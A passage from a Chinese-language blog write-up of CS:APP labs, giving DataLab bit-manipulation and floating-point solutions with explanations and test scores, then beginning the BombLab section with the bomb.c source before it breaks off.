<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * divpwr2 - Compute x/(2^n), for 0 &lt;= n &lt;= 30</span></span><br><span class="line"><span class="comment"> *  Round toward zero</span></span><br><span class="line"><span class="comment"> *   Examples: divpwr2(15,1) = 7, divpwr2(-33,4) = -2</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 15</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">divpwr2</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span> offset = (x &gt;&gt; <span class="number">31</span>) &amp; ((<span class="number">1</span> &lt;&lt; n) + (~<span class="number">0</span>));</span><br><span class="line">        <span class="keyword">return</span> (x + offset) &gt;&gt; n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong><br>题目要求<code>Round toward zero</code>即正数向下取整，负数向上取整，因此需要先利用<code>x &gt;&gt; 31</code>判断是否为负数，若为负数则偏置这个值，在x 加上 <code>offset(2 ^ n - 1)</code>((x&#x2F;y)向上取整 &#x3D; ((x+y-1)&#x2F;y)向下取整) 后右移n位就能实现<code>Round toward zero</code>。</p>
<h2 id="Problem-8"><a href="#Problem-8" class="headerlink" title="Problem 8"></a>Problem 8</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * negate - return -x </span></span><br><span class="line"><span class="comment"> *   Example: negate(1) = -1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 5</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">negate</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (~x) + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong><br>2’s complement表示法即为对x 取反码+1</p>
<h2 id="Problem-9"><a href="#Problem-9" class="headerlink" title="Problem 9"></a>Problem 9</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isPositive - return 1 if x &gt; 0, return 0 otherwise </span></span><br><span class="line"><span class="comment"> *   Example: isPositive(-1) = 0.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 8</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isPositive</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> !(!x | (x &gt;&gt; <span class="number">31</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong> </p>
<ul>
<li>若x为0, 则直接返回0.</li>
<li>否则返回x符号位取反的值，即x&lt;0时返回0, x&gt;0时返回1.</li>
</ul>
<h2 id="Problem-10"><a href="#Problem-10" class="headerlink" title="Problem 10"></a>Problem 10</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * isLessOrEqual - if x &lt;= y  then return 1, else return 0 </span></span><br><span class="line"><span class="comment"> *   Example: isLessOrEqual(4,5) = 1.</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 24</span></span><br><span class="line"><span class="comment"> *   Rating: 3</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isLessOrEqual</span><span class="params">(<span class="type">int</span> x, <span class="type">int</span> y)</span> &#123;</span><br><span class="line">        <span class="type">int</span> z = ((x + (~y)) &gt;&gt; <span class="number">31</span>);</span><br><span class="line">        x = x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">        y = y &gt;&gt; <span class="number">31</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> !!((x | !y) &amp; ((x &amp; !y) | z));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong><br>先进行<code>x-y-1</code>，将结果右移31位获得其符号位，若运算未发生溢出，则符号位即为预期返回值。<br>然后获取x,y符号位</p>
<ul>
<li>若<code>x | !y</code>为False, 即x&gt;0, y&lt;0, 此时返回False.</li>
<li>否则<ul>
<li>若<code>x &amp; !y</code>为True, 即x&lt;0, y&gt;0, 此时返回True.</li>
<li>否则x, y同号，<code>x-y-1</code>并不会溢出，因此返回其值。</li>
</ul>
</li>
</ul>
<h2 id="Problem-11"><a href="#Problem-11" class="headerlink" title="Problem 11"></a>Problem 11</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ilog2 - return floor(log base 2 of x), where x &gt; 0</span></span><br><span class="line"><span class="comment"> *   Example: ilog2(16) = 4</span></span><br><span class="line"><span class="comment"> *   Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *   Max ops: 90</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">ilog2</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="built_in">floor</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">floor</span> += (!!(x &gt;&gt; (<span class="number">16</span> + <span class="built_in">floor</span>))) &lt;&lt; <span class="number">4</span>;</span><br><span class="line">        <span class="built_in">floor</span> += (!!(x &gt;&gt; (<span class="number">8</span>  + <span class="built_in">floor</span>))) &lt;&lt; <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">floor</span> += (!!(x &gt;&gt; (<span class="number">4</span>  + <span class="built_in">floor</span>))) &lt;&lt; <span class="number">2</span>;</span><br><span class="line">        <span class="built_in">floor</span> += (!!(x &gt;&gt; (<span class="number">2</span>  + <span class="built_in">floor</span>))) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">floor</span> += (!!(x &gt;&gt; (<span class="number">1</span>  + <span class="built_in">floor</span>))) &lt;&lt; <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">floor</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong><br>ilog2实际上是找正整数x的最高位的1. 解决方法就是二分法: <code>floor += (!!(X &gt;&gt; (2 ^ n + floor))) &lt;&lt; n</code>.</p>
<h2 id="Problem-12"><a href="#Problem-12" class="headerlink" title="Problem 12"></a>Problem 12</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_neg - Return bit-level equivalent of expression -f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representations of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 10</span></span><br><span class="line"><span class="comment"> *   Rating: 2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">float_neg</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> ((uf &amp; <span class="number">0x7f800000</span>) == <span class="number">0x7f800000</span> &amp;&amp; (uf &amp; <span class="number">0x007fffff</span>) != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> uf;</span><br><span class="line">        <span class="keyword">return</span> uf ^ <span class="number">0x80000000</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong><br>先判断float值是否为NaN, 若为则直接返回uf, 若不为则改变符号位。</p>
<h2 id="Problem-13"><a href="#Problem-13" class="headerlink" title="Problem 13"></a>Problem 13</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_i2f - Return bit-level equivalent of expression (float) x</span></span><br><span class="line"><span class="comment"> *   Result is returned as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">float_i2f</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">        <span class="type">unsigned</span> sign_bit;</span><br><span class="line">        <span class="type">unsigned</span> e;</span><br><span class="line">        <span class="type">unsigned</span> m;</span><br><span class="line">        <span class="type">unsigned</span> tmp;</span><br><span class="line">        <span class="type">unsigned</span> truncated_num_lowest_bit;</span><br><span class="line">        <span class="type">unsigned</span> truncated_num_highest_bit;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        sign_bit = x &amp; <span class="number">0x80000000</span>;</span><br><span class="line">        e = <span class="number">0</span>;</span><br><span class="line">        m = x;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sign_bit) &#123;</span><br><span class="line">                m = -x;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        tmp = m;</span><br><span class="line">        <span class="keyword">while</span> (tmp)</span><br><span class="line">        &#123;</span><br><span class="line">                tmp &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">                e++;</span><br><span class="line">        &#125;</span><br><span class="line">        e -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (e &lt;= <span class="number">23</span>) &#123;</span><br><span class="line">                m = (m &lt;&lt; (<span class="number">23</span> - e)) &amp; <span class="number">0x007fffff</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                truncated_num_lowest_bit = m &amp; (-m);</span><br><span class="line">                truncated_num_highest_bit = m &amp; (<span class="number">1</span> &lt;&lt; (e - <span class="number">24</span>));</span><br><span class="line">                m = (m &gt;&gt; (e - <span class="number">23</span>));</span><br><span class="line">                <span class="keyword">if</span> (truncated_num_highest_bit) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (truncated_num_lowest_bit &lt; truncated_num_highest_bit) &#123;</span><br><span class="line">                                m += <span class="number">1</span>;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">if</span> (m &amp; <span class="number">1</span>) &#123;</span><br><span class="line">                                        m += <span class="number">1</span>;</span><br><span class="line">                                &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (m &amp; <span class="number">0x01000000</span>) &#123;</span><br><span class="line">                        e += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                m = m &amp; <span class="number">0x007fffff</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sign_bit | ((e + <span class="number">127</span>) &lt;&lt; <span class="number">23</span>) | m;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong> </p>
<ul>
<li>若x为0,直接返回0（因为绝对值小于1的浮点表示比较特殊，这里不需要自行转换，只会有0这一个特殊值，因此直接返回）</li>
<li>首先获取最高符号位，如果符号位为1, 即x为负数，则令<code>m=-x</code>，否则<code>m=x</code>，使得m为x的绝对值。</li>
<li>然后统计m位数，这里的e是指阶码，因此要减去1，表示要右移的位数。<ul>
<li>如果<code>e&lt;=23</code>，则说明m会左移，不会截断二进制数，因此直接进行左移操作，使小数点后第一位对齐到23位。</li>
<li>否则，有可能会产生截断，因此需要舍入，IEEE 754标准中，采用<strong>向偶数舍入</strong>的方法，因此进行<code>else</code>语句块内的一系列操作实现，注意，这里的半数边界为<strong>10…00</strong></li>
</ul>
</li>
<li>最后整理符号位，阶码，尾数即可得到目标值。</li>
</ul>
<h2 id="Problem-14"><a href="#Problem-14" class="headerlink" title="Problem 14"></a>Problem 14</h2><p><strong>Code:</strong> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * float_twice - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int&#x27;s, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">float_twice</span><span class="params">(<span class="type">unsigned</span> uf)</span> &#123;</span><br><span class="line">        <span class="type">unsigned</span> sign_bit = uf &amp; <span class="number">0x80000000</span>;</span><br><span class="line">        <span class="type">unsigned</span> e = (uf &amp; <span class="number">0x7f800000</span>) &gt;&gt; <span class="number">23</span>;</span><br><span class="line">        <span class="type">unsigned</span> m = uf &amp; <span class="number">0x007fffff</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (e == <span class="number">0xff</span> &amp;&amp; m != <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> uf;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (e == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (m &amp; <span class="number">0x00400000</span>) &#123;</span><br><span class="line">                        e += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                m &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                e += <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        m = m &amp; <span class="number">0x007fffff</span>;</span><br><span class="line">        <span class="keyword">if</span> (e == <span class="number">0x100</span>) &#123;</span><br><span class="line">                e = <span class="number">0xff</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sign_bit | (e &lt;&lt; <span class="number">23</span>) | m;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>Explaination:</strong> </p>
<ul>
<li>首先判断是否为NaN，若为NaN，则返回其本身。</li>
<li>若为非规格化数，则左移m，如果m左移溢出，则e++。</li>
<li>若为规格化数<ul>
<li>如果e不为最大阶数，则e++</li>
</ul>
</li>
<li>最后返回目标值。</li>
</ul>
<h2 id="Summarize"><a href="#Summarize" class="headerlink" title="Summarize"></a>Summarize</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">myarch% ./dlc bits.c</span><br><span class="line">dlc:bits.c:143:bitAnd: 4 operators</span><br><span class="line">dlc:bits.c:157:getByte: 5 operators</span><br><span class="line">dlc:bits.c:169:logicalShift: 6 operators</span><br><span class="line">dlc:bits.c:199:bitCount: 36 operators</span><br><span class="line">dlc:bits.c:214:bang: 12 operators</span><br><span class="line">dlc:bits.c:223:tmin: 1 operators</span><br><span class="line">dlc:bits.c:238:fitsBits: 6 operators</span><br><span class="line">dlc:bits.c:250:divpwr2: 7 operators</span><br><span class="line">dlc:bits.c:260:negate: 2 operators</span><br><span class="line">dlc:bits.c:270:isPositive: 4 operators</span><br><span class="line">dlc:bits.c:284:isLessOrEqual: 13 operators</span><br><span class="line">dlc:bits.c:302:ilog2: 30 operators</span><br><span class="line">dlc:bits.c:318:float_neg: 6 operators</span><br><span class="line">dlc:bits.c:378:float_i2f: 28 operators</span><br><span class="line">dlc:bits.c:411:float_twice: 17 operators</span><br><span class="line">myarch% ./btest</span><br><span class="line">Score	Rating	Errors	Function</span><br><span class="line"> 1	1	0	bitAnd</span><br><span class="line"> 2	2	0	getByte</span><br><span class="line"> 3	3	0	logicalShift</span><br><span class="line"> 4	4	0	bitCount</span><br><span class="line"> 4	4	0	bang</span><br><span class="line"> 1	1	0	tmin</span><br><span class="line">ERROR: Test fitsBits(-2147483648[0x80000000],32[0x20]) failed...</span><br><span class="line">...Gives 1[0x1]. Should be 0[0x0]</span><br><span class="line"> 2	2	0	divpwr2</span><br><span class="line"> 2	2	0	negate</span><br><span class="line"> 3	3	0	isPositive</span><br><span class="line"> 3	3	0	isLessOrEqual</span><br><span class="line"> 4	4	0	ilog2</span><br><span class="line"> 2	2	0	float_neg</span><br><span class="line"> 4	4	0	float_i2f</span><br><span class="line"> 4	4	0	float_twice</span><br><span class="line">Total points: 39/41</span><br></pre></td></tr></table></figure>

<p><code>fitsBits</code>的测试样例似乎有问题，因此没有给出。</p>
<h1 id="2-BombLab"><a href="#2-BombLab" class="headerlink" title="2. BombLab"></a>2. BombLab</h1><p><strong>DirectoryLayout:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── answers.txt</span><br><span class="line">├── bomb</span><br><span class="line">├── bomb.c</span><br><span class="line">├── disasm.asm</span><br><span class="line">└── README</span><br></pre></td></tr></table></figure>



<p><strong>bomb.c:</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/***************************************************************************</span></span><br><span class="line"><span class="comment"> * Dr. Evil&#x27;s Insidious Bomb, Version 1.1</span></span><br><span class="line"><span class="comment"> * Copyright 2011, Dr. Evil Incorporated. All rights reserved.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * LICENSE:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Dr. Evil Incorporated (the PERPETRATOR) hereby grants you (the</span></span><br><span class="line"><span class="comment"> * VICTIM) explicit permission to use this bomb (the BOMB).  This is a</span></span><br><span class="line"><span class="comment"> * time limited license, which expires on the death of the VICTIM.</span></span><br><span class="line"><span class="comment"> * The PERPETRATOR takes no responsibility for damage, frustration,</span></span><br><span class="line"><span class="comment"> * insanity, bug-eyes, carpal-tunnel syndrome, loss of sleep, or other</span></span><br><span class="line"><span class="comment"> * harm to the VICTIM.  Unless the PERPETRATOR wants to take credit,</span></span><br><span class="line"><span class="comment"> * that is.  The VICTIM may not distribute this bomb source code to</span></span><br><span class="line"><span class="comment"> * any enemies of the PERPETRATOR.  No VICTIM may debug,</span></span><br><span class="line"><span class="comment"> * reverse-engineer, run &quot;strings&quot; on, decompile, decrypt, or use any</span></span><br><span class="line"><span class="comment"> * other technique to gain knowledge of and defuse the BOMB.  BOMB</span></span><br><span class="line"><span class="comment"> * proof clothing may not be worn when handling this program.  The</span></span><br><span class="line"><span class="comment"> * PERPETRATOR will not apologize for the PERPETRATOR&#x27;s poor sense of</span></span><br><span class="line"><span class="comment"> * humor.  This license is null and void where the BOMB is prohibited</span></span><br><span class="line"><span class="comment"> * by law.</span></span><br><span class="line"><span class="comment"> ***************************************************************************/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;support.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;phases.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * Note to self: Remember to erase this file so my victims will have no</span></span><br><span class="line"><span class="comment"> * idea what is going on, and so they will all blow up in a</span></span><br><span class="line"><span class="comment"> * spectaculary fiendish explosion. -- Dr. Evil </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">FILE *infile;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *input;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Note to self: remember to port this bomb to Windows and put a </span></span><br><span class="line"><span class="comment">     * fantastic GUI on it. */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with no arguments, the bomb reads its input lines </span></span><br><span class="line"><span class="comment">     * from standard input. */</span></span><br><span class="line">    <span class="keyword">if</span> (argc == <span class="number">1</span>) &#123;  </span><br><span class="line">        infile = <span class="built_in">stdin</span>;</span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">/* When run with one argument &lt;file&gt;, the bomb reads from &lt;file&gt; </span></span><br><span class="line"><span class="comment">     * until EOF, and then switches to standard input. Thus, as you 